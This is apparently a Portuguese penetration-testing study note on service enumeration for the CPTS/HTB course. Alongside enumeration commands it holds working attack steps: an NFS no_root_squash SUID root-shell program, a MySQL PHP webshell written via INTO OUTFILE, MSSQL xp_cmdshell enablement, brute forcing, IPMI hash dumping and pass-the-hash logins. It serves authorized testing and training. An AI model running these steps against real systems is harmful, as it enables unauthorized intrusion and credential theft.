---
tema: Pentest / Enumeração
tópico: Fase 04 — Enumeração de Serviços
tags: [htb, cpts, engage, enumeracao, ftp, smb, nfs, dns, smtp, sql, ssh, rdp, winrm, snmp, ipmi]
dificuldade: easy
---

# 🔍 Fase 04 — Enumeração de Serviços

> [!info] Objetivo
> Transformar "porta aberta" em informação acionável: versão exata, contas válidas, arquivos, credenciais, dados e hipóteses de ataque.
> Regra do engage: **enumere até doer**. A maioria dos footholds vem de enumeração profunda, não de zero-day.

---

## 🎯 Quando entrar

- Imediatamente após o Nmap (Fase 03) entregar a lista de portas abertas por host.
- A cada nova rede alcançada (pivoting) ou nova credencial (reabre serviços que exigiam auth).
- Quando um banner parece "genérico" — quase sempre esconde produto e versão específicos.

---

## 📥 Pré-requisitos e inputs

| Input | Origem | Uso |
|-------|--------|-----|
| Lista host × porta × serviço | Fase 03 (`-oA`) | Ordem de trabalho |
| Versão do serviço | `-sV` | Escolher exploits/scripts corretos |
| Lista de usuários/e-mails | Fase 02 | User enum, spraying, username-as-password |
| Wordlists | SecLists | Brute e enum |
| RoE (brute permitido?) | Fase 01 | Define se pode usar hydra/nxc bruteforce |
| Credencial inicial (grey-box) | Cliente | Enumeração autenticada, sempre muito mais rica |
| Pasta `03-enum/<servico>/` | Você | Evidência organizada por serviço |

```bash
cd ~/engages/<CLIENTE>/03-enum && mkdir -p ftp smb nfs dns mail sql ssh rdp winrm snmp ipmi
```

> [!tip] Ordem de prioridade
> 1) SMB/NFS/FTP (dados e credenciais) · 2) SQL (auth fraca → exec de comando) · 3) SNMP/IPMI (informação e hash) · 4) SSH/RDP/WinRM (acesso) · 5) mail/DNS (usuários e nomes).

---

## 🪜 Passo a passo

Cada bloco segue: **portas → comandos → o que procurar**. Antes de atacar, sempre compare a versão com a documentação do vendor.

### 1. FTP — 21/tcp (dados e 20/tcp)

```bash
# Banner e teste de anonymous com um comando só
nc -v <IP> 21
ftp <IP>          # usuário: anonymous  senha: (enter)

# NSE: anonymous, sistema, bounce e backdoors conhecidos
sudo nmap -p21 -sV --script ftp-anon,ftp-syst,ftp-bounce,ftp-vsftpd-backdoor,ftp-proftpd-backdoor <IP>

# Baixa tudo (útil quando anonymous lista arquivos)
wget -m --no-passive ftp://anonymous:anonymous@<IP>/

# Dentro da sessão: lista, entra em subpasta, baixa em lote
# ls -la ; cd backup ; binary ; mget *
```

| Porta | Ferramenta | O que procurar |
|-------|-----------|----------------|
| 21 | `ftp`, `nc`, `lftp` | anonymous habilitado, banner de versão |
| 21 | `nmap --script ftp-*` | backdoor vsftpd/proftpd, bounce |
| 21 | `wget -m` | arquivos: config, backup, `.env`, código-fonte |
| 21 | `hydra` | credencial fraca (só se o RoE permitir) |

```bash
# Brute de FTP (respeitando rate do RoE)
hydra -l <USUARIO> -P ~/wordlists/rockyou.txt -f -t 4 ftp://<IP>
```

**Procurar:** login anônimo, permissão de escrita (upload de webshell se houver web root), configurações e credenciais em arquivos, versão com backdoor.

### 2. SMB — 139/445/tcp

```bash
# Null session: lista shares sem credencial (o primeiro teste sempre)
smbclient -L //<IP>/ -N
smbclient //<IP>/<SHARE> -N            # navega no share; use -U <USUARIO>%<SENHA> com credencial

# smbmap: permissões de cada share (R/W) e listagem recursiva
smbmap -H <IP> -u <USUARIO> -p <SENHA> -R
smbmap -H <IP> -u '' -p ''             # null

# netexec (nxc): shares, usuários, grupos, política de senha, RID brute
nxc smb <IP> -u '' -p '' --shares
nxc smb <IP> -u '<USUARIO>' -p '<SENHA>' --shares --pass-pol
nxc smb <IP> -u 'guest' -p '' --rid-brute 2000

# enum4linux-ng: tudo de uma vez (usuários, shares, SO, política)
enum4linux-ng -A <IP>

# rpcclient com sessão nula — enumera domínio sem smbclient
rpcclient -U "" -N <IP>
# dentro: enumdomusers ; enumdomgroups ; querydominfo ; netshareenumall ; lookupnames administrator

# NSE completo + vulnerabilidades conhecidas
sudo nmap -p139,445 --script smb-os-discovery,smb-enum-shares,smb-enum-users,smb2-security-mode <IP>
sudo nmap -p445 --script "smb-vuln-*" --script-args=unsafe=1 <IP>   # intrusive
```

**Procurar:** null session, shares com escrita, listas de usuários, política de senha (define o spray), SMB signing desabilitado (relay), versão do SO, MS17-010.

### 3. NFS — 111/2049/tcp (+ rpcbind)

```bash
# Lista os exports e quem pode montar
showmount -e <IP>
sudo nmap -p111 --script nfs-ls,nfs-showmount,nfs-statfs <IP>

# Monta o export localmente e navega como se fosse pasta
sudo mkdir -p /mnt/nfs && sudo mount -t nfs <IP>:/<EXPORT> /mnt/nfs -o nolock
ls -la /mnt/nfs
```

```bash
# Se o export tiver no_root_squash: você cria um binário SUID como root local
cat > /tmp/suid.c <<'EOF'
#include <unistd.h>
int main(void){ setuid(0); setgid(0); execl("/bin/bash","bash",NULL); return 0; }
EOF
gcc /tmp/suid.c -o /mnt/nfs/suid && sudo chown root:root /mnt/nfs/suid && sudo chmod 4755 /mnt/nfs/suid
# Na máquina alvo (via shell/serviço): /mnt/nfs/suid → root
```

**Procurar:** `no_root_squash`, export legível com chaves SSH (`id_rsa`), backups, homedirs. Chave privada achada em NFS vale mais que qualquer exploit.

### 4. DNS — 53/tcp+udp

```bash
# Zone transfer: entrega a zona inteira quando mal configurado
dig axfr @<IP> <DOMINIO>
dnsrecon -d <DOMINIO> -n <IP> -t std,axfr,brt
fierce --domain <DOMINIO> --dns-servers <IP>

# NSE: transferência, brute e verificação de recursão aberta
sudo nmap -p53 --script dns-zone-transfer,dns-brute,dns-recursion,dns-cache-snoop \
  --script-args dns-brute.domain=<DOMINIO>,dns-zone-transfer.domain=<DOMINIO> <IP>

# Versão do BIND e cache
dig CH TXT version.bind @<IP>
dig +short @<IP> <DOMINIO> A
```

**Procurar:** AXFR aberto (hosts internos com nome explícito), recursão aberta (amplificação/poisoning), versão desatualizada do BIND, registros internos vazados.

### 5. SMTP / IMAP / POP3 — 25,110,143,465,587,993,995

```bash
# SMTP: comandos aceitos, NTLM, relay aberto e enumeração de usuários
sudo nmap -p25 --script smtp-commands,smtp-ntlm-info,smtp-open-relay,smtp-enum-users \
  --script-args smtp-enum-users.methods={VRFY,EXPN,RCPT} <IP>

# smtp-user-enum: valida usuários por VRFY/EXPN/RCPT
smtp-user-enum -M VRFY -U usuarios.txt -t <IP>
smtp-user-enum -M RCPT -U usuarios.txt -t <IP> -D <DOMINIO>

# Teste de envio (só com autorização explícita de phish/relay no RoE)
swaks --to <EMAIL> --from teste@<DOMINIO> --server <IP> --body "teste"

# IMAP/POP3: capabilities, banners e brute
sudo nmap -p110,143 --script pop3-capabilities,pop3-brute,imap-capabilities,imap-brute \
  --script-args userdb=usuarios.txt,passdb=~/wordlists/rockyou.txt <IP>
openssl s_client -connect <IP>:993 -quiet      # banner IMAP sobre TLS
curl -k "imap://<IP>/" --user <USUARIO>:<SENHA>
```

**Procurar:** usuários válidos (alimenta spray e Kerberos), relay aberto (spam em nome do cliente), versão do MTA, acesso a caixa de correio (documentos e credenciais dentro de e-mails).

### 6. MySQL — 3306/tcp

```bash
# Conexão: teste de root sem senha primeiro
mysql -h <IP> -u root
mysql -h <IP> -u root -p'<SENHA>' -e 'select @@version, current_user();'

# NSE: info, usuários, bases e teste de senha vazia
sudo nmap -p3306 --script mysql-info,mysql-enum,mysql-databases,mysql-users,mysql-empty-password,mysql-brute <IP>

# netexec: executa query com credencial (útil em spray)
nxc mysql <IP> -u root -p '' -q "select @@version"
```

```sql
-- Depois de entrar: reconhecer privilégio e arquivos
SELECT user, authentication_string FROM mysql.user;
SHOW DATABASES;
SELECT LOAD_FILE('/etc/passwd');            -- só com FILE privilege
SELECT @@secure_file_priv;                  -- diretório permitido para outfile
SELECT "<?php system($_GET['c']); ?>" INTO OUTFILE '/var/www/html/s.php';   -- webshell
```

**Procurar:** root sem senha, privilégio `FILE` (LFI → RCE via webshell), hashes em `mysql.user`, bases com dados de cliente.

### 7. MSSQL — 1433/tcp (1434/udp para SQL Browser)

```bash
# NSE: info, NTLM, config, senha vazia, hashes e xp_cmdshell
sudo nmap -p1433 --script ms-sql-info,ms-sql-ntlm-info,ms-sql-config,ms-sql-empty-password,\
ms-sql-dump-hashes,ms-sql-xp-cmdshell <IP>

# impacket: shell interativo via SQL (Windows auth ou sa)
mssqlclient.py <USUARIO>:<SENHA>@<IP> -windows-auth
mssqlclient.py sa:<SENHA>@<IP>

# netexec: query rápida e execução de comando com credencial
nxc mssql <IP> -u <USUARIO> -p '<SENHA>' -q "select @@version"
nxc mssql <IP> -u <USUARIO> -p '<SENHA>' -x "whoami"
```

```sql
-- Habilitar execução de comando (se ainda estiver off e você tiver sysadmin)
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';

-- Reconhecer privilégio além do cmd
SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin');
EXEC sp_linkedservers;                          -- pivô para outro SQL Server
SELECT * FROM OPENQUERY("SRV-LINKED", 'select @@version');
```

**Procurar:** `sa` com senha fraca, `xp_cmdshell` habilitado, sysadmin (dá privesc no Windows), linked servers (pivô), credenciais em tabelas de aplicação.

### 8. Oracle — 1521/tcp (TNS Listener)

```bash
# NSE: versão do TNS, brute de SID e usuários
sudo nmap -p1521 --script oracle-tns-version,oracle-sid-brute,oracle-enum-users,oracle-brute <IP>

# odat: toolkit completo (SID, credenciais, upload, privesc)
odat all -s <IP> -p 1521
odat sidguesser -s <IP> -p 1521
odat passwordguesser -s <IP> -p 1521 -d <SID>

# sqlplus: conexão direta ao SID
sqlplus <USUARIO>/<SENHA>@<IP>:1521/<SID>
```

**Procurar:** SID oculto (brute), contas default (`scott/tiger`, `system/manager`), versão antiga com CVEs de TNS, `odat` para RCE e coleta de hashes.

### 9. SSH — 22/tcp

```bash
# Banner e algoritmo/versão
nc -v <IP> 22
sudo nmap -p22 --script ssh-auth-methods,ssh2-enum-algos,ssh-hostkey --script-args="ssh.user=root" <IP>

# Auditoria de criptografia (detecta algoritmos fracos/legados)
ssh-audit <IP>

# Enumeração de usuários (OpenSSH < 7.7) — CVE-2018-15473
msfconsole -q -x "use auxiliary/scanner/ssh/ssh_enumusers; set RHOSTS <IP>; set USER_FILE usuarios.txt; run"
```

```bash
# Chave privada achada (NFS, share, backup): extrai a pública e valida a passphrase
ssh-keygen -y -f id_rsa > id_rsa.pub
ssh2john id_rsa > id_rsa.hash && john --wordlist=~/wordlists/rockyou.txt id_rsa.hash
ssh -i id_rsa <USUARIO>@<IP>
```

**Procurar:** versão antiga, `passwordauthentication yes` (permite brute), métodos de auth aceitos, chaves privadas vazadas e usuários válidos.

### 10. RDP — 3389/tcp

```bash
# NSE: nível de criptografia aceito e info NTLM (nome do host/domínio)
sudo nmap -p3389 --script rdp-enum-encryption,rdp-ntlm-info <IP>
nxc rdp <IP> -u <USUARIO> -p '<SENHA>'

# Conexão
xfreerdp /v:<IP> /u:<USUARIO> /p:'<SENHA>' /cert:ignore /dynamic-resolution
xfreerdp /v:<IP> /u:<USUARIO> /pth:<HASH> /cert:ignore     # pass-the-hash (se RDS permitir)
```

**Procurar:** NLA desabilitado, hostname/domínio via NTLM (alimenta AD), credencial válida, sistemas antigos (Windows 7/2008 R2 vulneráveis a BlueKeep, CVE-2019-0708).

### 11. WinRM — 5985/tcp (HTTP) e 5986/tcp (HTTPS)

```bash
# Presença do serviço (405 Method Not Allowed confirma WinRM ativo)
curl -s -o /dev/null -w '%{http_code}\n' http://<IP>:5985/wsman
sudo nmap -p5985,5986 --script http-title,http-headers <IP>

# Acesso com credencial ou hash
nxc winrm <IP> -u <USUARIO> -p '<SENHA>'
evil-winrm -i <IP> -u <USUARIO> -p '<SENHA>'
evil-winrm -i <IP> -u <USUARIO> -H <HASH>
```

**Procurar:** WinRM exposto + credencial válida = shell PowerShell completo, sem exploit. Muito comum como "próximo passo" após obter credencial.

### 12. SNMP — 161/udp (trap em 162/udp)

```bash
# Adivinha a community string (public/private/manager são comuns)
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <IP>

# Coleta completa com a community encontrada
snmpwalk -v2c -c public <IP>
snmpwalk -v2c -c public <IP> 1.3.6.1.2.1.25.4.2.1.2     # processos em execução
snmpwalk -v2c -c public <IP> 1.3.6.1.2.1.1.5.0         # hostname
snmp-check <IP> -c public

# NSE: brute, interfaces, processos e usuários do Windows
sudo nmap -sU -p161 --script snmp-brute,snmp-info,snmp-interfaces,snmp-processes,snmp-win32-users <IP>
```

**Procurar:** community string (`public`, `private`, `manager`), rotas e interfaces (mapa de rede interna grátis), processos, software instalado, usuários — e credenciais em texto nos OIDs.

### 13. IPMI — 623/udp

```bash
# Versão e teste de cipher zero (aceita auth vazia, comum em BMC antigo)
sudo nmap -sU -p623 --script ipmi-version,ipmi-cipher-zero <IP>

# ipmitool com credencial default
ipmitool -I lanplus -H <IP> -U ADMIN -P ADMIN chassis status
ipmitool -I lanplus -H <IP> -U ADMIN -P ADMIN user list

# Captura o hash RAKP (bateria de chapas) e quebra offline
msfconsole -q -x "use auxiliary/scanner/ipmi/ipmi_dumphashes; set RHOSTS <IP>; set OUTPUT_HASHCAT_FILE ipmi.txt; run"
hashcat -m 7300 ipmi.txt ~/wordlists/rockyou.txt
```

**Procurar:** IPMI 2.0 com cipher zero, credenciais default (`ADMIN/ADMIN`, `root/calvin`), hash RAKP crackeável, firmware antigo (RCE em BMC).

### 14. Fechamento da enumeração

Para **cada** serviço, escreva na nota do engage: versão exata, contas encontradas, arquivos/dados, credenciais, misconfiguração e a hipótese de ataque com o link para o módulo CPTS correspondente.

---

## 🧰 Ferramentas

| Ferramenta | Serviços | Função |
|------------|----------|--------|
| `nmap` (NSE) | todos | Scripts de enum por serviço |
| `netexec` (nxc) | SMB, MSSQL, WinRM, RDP, MySQL, LDAP | Enum + spray em vários protocolos |
| `smbclient`, `smbmap`, `rpcclient` | SMB | Shares, arquivos, RPC/domínio |
| `enum4linux-ng` | SMB/RPC | Pacote de enumeração |
| `showmount`, `mount -t nfs` | NFS | Exports e acesso a arquivo |
| `dig`, `dnsrecon`, `fierce` | DNS | AXFR, brute, recursão |
| `theHarvester`, `smtp-user-enum` | SMTP | Usuários e e-mails |
| `*.py` (impacket) | MSSQL/AD | `mssqlclient`, `smbclient`, `secretsdump` |
| `odat`, `sqlplus` | Oracle | Enum, brute, privesc |
| `ssh-audit` | SSH | Algoritmos e versão |
| `evil-winrm` | WinRM | Shell PowerShell remoto |
| `snmpwalk`, `onesixtyone`, `snmp-check` | SNMP | Community, OIDs, dados |
| `ipmitool` + MSF | IPMI | Default creds e dump de hash RAKP |
| `hydra`, `hashcat`, `john` | todos | Força bruta (se RoE permitir) e cracking |

---

## 🔀 Árvore de decisão

| Condição | Ação |
|----------|------|
| SMB aceita null session e lista shares | Ler os shares; procurar credenciais em `*.config`, `.env`, scripts, backups |
| SMB signing desabilitado + NTLM presente | Considerar relay NTLM (avaliar com Responder nxc) |
| FTP anonymous com escrita e há web root | Upload de webshell (ver Fase 06) |
| NFS com `no_root_squash` | Compilar binário SUID e escalar quando tiver shell |
| SSH aceita password auth e há lista de usuários | Spray lento e único (evitar lockout) |
| SQL com `sa`/`root` fraco | Habilitar `xp_cmdshell`/`FILE` → RCE ou webshell |
| SNMP responde `public` | `snmpwalk` completo: rotas, processos, usuários, software |
| IPMI exposto com cipher zero | Dump de hash RAKP + crack offline |
| WinRM/RDP exposto e credencial válida | Shell/área de trabalho — documentar impacto |
| Serviço com versão antiga conhecida | Correlacionar CVE só com confirmação; validar antes de explorar |
| Nada legível sem credencial | Voltar a Fase 02 (usuário/senha) e testar reuso/spray |
| Credencial nova obtida | Reenumerar **tudo** com ela — inclusive serviços que negavam antes |

---

## 📤 Evidências a registrar

- Por serviço: banner/versão exata e comando usado.
- Contas válidas descobertas, com o método (VRFY, RID brute, SNMP, msg NTLM).
- Shares/exports e permissões (leitura/escrita), com captura do `ls`.
- Arquivos sensíveis encontrados (nome, caminho, trecho mascarado).
- Credenciais/hashes obtidos (referência ao cofre, nunca o valor no relatório).
- Misconfigurações com prova (`smb2-security-mode`, `no_root_squash`, `cipher zero`).
- Política de senha (para justificar a estratégia de spray).
- Hipótese de ataque por serviço + o motivo técnico.

---

## 🕳️ Pegadinhas

- 🕳️ **Aceitar o título do Nmap como verdade.** Banner é falsificável; confirme com `nc`/cliente nativo.
- 🕳️ **Ignorar null session** porque "hoje não é comum". Ainda é a causa de muito ganho.
- 🕳️ **Brute agressivo.** Trava conta de serviço, dispara alarme e queima o engage (seu próprio usuário).
- 🕳️ **Esquecer 111/rpcbind** quando só 2049 aparece — sem `showmount` você não vê os exports.
- 🕳️ **MSSQL sem checar `sysadmin`.** `xp_cmdshell` restrito não impede outros caminhos (`impersonation`, linked server).
- 🕳️ **MySQL `LOAD_FILE`/`OUTFILE` sem checar `secure_file_priv`.** Falha silenciosa.
- 🕳️ **RDP/WinRM com credencial achada e não documentar** — você perde a evidência do impacto.
- 🕳️ **Tratar SNMP como irrelevante.** Entrega o mapa da rede interna e, às vezes, senha.
- 🕳️ **Scan UDP sem `-Pn`.** Resultado vazio sem indicação de erro.
- 🕳️ **Repetir USER* em serviços Windows.** Bloqueia conta e reduz suas opções depois.
- 🕳️ **Enumeração horizontal sem profundidade.** Uma porta mal lida custa mais que dez portas não lidas.

---

## ✅ Checklist

- [ ] Porta → serviço → versão confirmado (não só o banner)
- [ ] FTP: anonymous e escrita testados
- [ ] SMB: null session, shares, usuários, política, signing
- [ ] RPC: `enumdomusers` / `enumdomgroups` executados
- [ ] NFS: exports listados e montados, `no_root_squash` checado
- [ ] DNS: AXFR, brute e recursão testados
- [ ] SMTP: usuários (VRFY/RCPT), relay e NTLM info
- [ ] IMAP/POP3: capabilities e acesso testados
- [ ] MySQL: root vazio, `FILE`/`secure_file_priv`, bases
- [ ] MSSQL: `sa`, sysadmin, `xp_cmdshell`, linked servers
- [ ] Oracle: SID, contas default, `odat`
- [ ] SSH: versão, algoritmos, auth methods, chaves
- [ ] RDP: NLA/criptografia, NTLM info, credencial
- [ ] WinRM: presença e acesso testados
- [ ] SNMP: community, walk completo, dados úteis
- [ ] IPMI: versão, cipher zero, hash RAKP
- [ ] Wordlists e listas de usuários do Fase 02 usadas
- [ ] Cada serviço com hipótese de ataque escrita
- [ ] Evidências salvas em `03-enum/<servico>/`

---

## 🔗 Relacionado

- [[Workflow do Engage]]
- [[CPTS 04 - Footprinting]]
- [[CPTS 11 - Attacking Common Services]]
- [[CPTS 10 - Password Attacks]]
- [[Fase 03 - Reconhecimento de Rede]]
